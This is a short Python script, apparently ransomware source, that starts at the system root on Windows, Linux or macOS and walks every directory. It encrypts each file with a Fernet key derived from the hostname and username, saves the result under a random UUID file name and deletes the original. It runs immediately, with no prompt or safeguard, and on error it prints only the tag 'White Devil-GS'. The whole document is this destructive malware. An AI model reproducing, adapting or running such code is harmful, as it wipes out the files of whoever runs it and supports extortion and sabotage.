import os
import platform
import getpass
import uuid
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from base64 import urlsafe_b64encode

def get_root_directory():
    os_name = platform.system()
    if os_name == 'Windows':
        return 'C:\\'
    elif os_name == 'Linux' or os_name == 'Darwin':
        return '/'
    else:
        raise NotImplementedError(f"Unsupported OS: {os_name}")

def generate_key_from_password(password: str) -> bytes:
    password_bytes = password.encode()
    salt = b'\x00' * 16  
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = urlsafe_b64encode(kdf.derive(password_bytes))
    return key

def generate_system_based_password() -> str:
    hostname = platform.node()
    username = getpass.getuser()
    system_info = f"{hostname}-{username}"
    return system_info

def generate_random_filename(original_filename: str) -> str:
    unique_id = uuid.uuid4().hex
    file_extension = os.path.splitext(original_filename)[1]
    new_filename = f"{unique_id}{file_extension}"
    return new_filename

def process_files(root_dir):
    password = generate_system_based_password()  
    key = generate_key_from_password(password)
    cipher = Fernet(key)
    
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            new_filename = generate_random_filename(filename)
            new_file_path = os.path.join(dirpath, new_filename)


            with open(file_path, "r") as gs:
                data_devil = gs.read()


            encrypted_data = cipher.encrypt(data_devil.encode())


            with open(new_file_path, "wb") as f:
                f.write(encrypted_data)

   
            os.remove(file_path)



try:
    root_directory = get_root_directory()

    process_files(root_directory)
except Exception as e:
    print("White Devil-GS")

